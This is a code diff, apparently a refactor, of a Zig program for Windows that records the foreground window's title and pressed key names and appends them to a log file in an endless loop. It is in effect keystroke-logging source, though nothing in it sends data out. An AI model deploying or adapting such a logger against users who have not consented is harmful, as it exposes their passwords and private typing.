@@ -25,10 +25,11 @@ const PrevType = enum {
 pub fn main(init: std.process.Init) !void {
     const minimal = init.minimal;
     const allocator = init.arena.allocator();
+    const io = init.io;
 
     const stdout_buffer = try allocator.alloc(u8, 1024);
     defer allocator.free(stdout_buffer);
-    var stdout_writer = File.stdout().writer(init.io, stdout_buffer);
+    var stdout_writer = File.stdout().writer(io, stdout_buffer);
     const stdout = &stdout_writer.interface;
 
     var args_iter = minimal.args.iterate();
@@ -67,7 +68,7 @@ pub fn main(init: std.process.Init) !void {
     if (arg_output_path.items.len == 0) {
         if (arg_use_date) {
             const clock: Clock = .real;
-            const now = clock.now(init.io).toSeconds();
+            const now = clock.now(io).toSeconds();
             const localtime = cTime.localtime(&now);
 
             var output_path_b: [1024]u8 = undefined;
@@ -93,17 +94,19 @@ pub fn main(init: std.process.Init) !void {
         try stdout.flush();
     }
 
-    var file = try cwd().createFile(init.io, arg_output_path.items, .{
+    var file = try cwd().createFile(io, arg_output_path.items, .{
         .truncate = false,
     });
-    defer file.close(init.io); // Actually never reached because of while(true) later below.
-
-    try file.seekFromEnd(0); // Append to end.
+    defer file.close(io); // Actually never reached because of while(true) later below.
 
     const writer_buf = try allocator.alloc(u8, 1024);
     defer allocator.free(writer_buf);
-    var writer_io = file.writer(init.io, writer_buf);
-    const writer = &writer_io.interface;
+    var file_writer = file.writer(io, writer_buf);
+    const io_writer = &file_writer.interface;
+
+    // Append to end.
+    const end = try file.length(io);
+    try file_writer.seekTo(end);
 
     const title_len: usize = 1024;
     const title_len_i: c_uint = @intCast(title_len - 1);
@@ -119,7 +122,7 @@ pub fn main(init: std.process.Init) !void {
 
     var prev_type: PrevType = .init;
     while (true) {
-        init.io.sleep(arg_sleep);
+        io.sleep(arg_sleep);
 
         const hwnd: cWindows.HWND = cWindows.GetForegroundWindow();
         const ctitle_len = cWindows.GetWindowTextA(hwnd, ctitle_b.ptr, title_len_i);
@@ -133,15 +136,15 @@ pub fn main(init: std.process.Init) !void {
             switch (prev_type) {
                 .init => {
                     if (file_exists) {
-                        try writer.writeAll("\n");
+                        try io_writer.writeAll("\n");
                     }
                 },
                 .window => {},
-                .key => try writer.writeAll("\n"),
+                .key => try io_writer.writeAll("\n"),
             }
-            try writer.writeAll("window: '");
-            try writer.writeAll(ctitle_s);
-            try writer.writeAll("'\n");
+            try io_writer.writeAll("window: '");
+            try io_writer.writeAll(ctitle_s);
+            try io_writer.writeAll("'\n");
             @memcpy(ptitle_b, ctitle_b);
             prev_type = .window;
         }
@@ -154,12 +157,12 @@ pub fn main(init: std.process.Init) !void {
                 if (arg_verbose >= 1) {
                     print("key: '{s}' ({d})\n", .{ key_name_s, key_i });
                 }
-                try writer.writeAll(key_name_s);
+                try io_writer.writeAll(key_name_s);
                 prev_type = .key;
             }
         }
     }
-    try writer.flush();
+    try io_writer.flush();
 }
 
 fn printHeader(stdout: *Writer) !void {
